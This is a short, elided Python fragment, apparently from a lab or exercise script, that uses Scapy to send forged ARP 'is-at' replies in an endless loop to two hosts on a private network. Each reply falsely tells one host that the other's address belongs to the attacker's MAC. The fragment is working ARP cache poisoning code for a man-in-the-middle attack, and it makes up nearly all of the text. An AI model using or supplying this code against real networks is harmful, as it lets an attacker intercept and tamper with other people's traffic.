...
def main() -> None:
    ...
    try:
        ...
        while True:
            send(ARP(op='is-at', pdst='192.168.0.17', psrc='192.168.0.23', hwsrc='02:42:ac:11:00:04'), verbose=False)
            send(ARP(op='is-at', pdst='192.168.0.23', psrc='192.168.0.17', hwsrc='02:42:ac:11:00:04'), verbose=False)
            # time.sleep(1) 
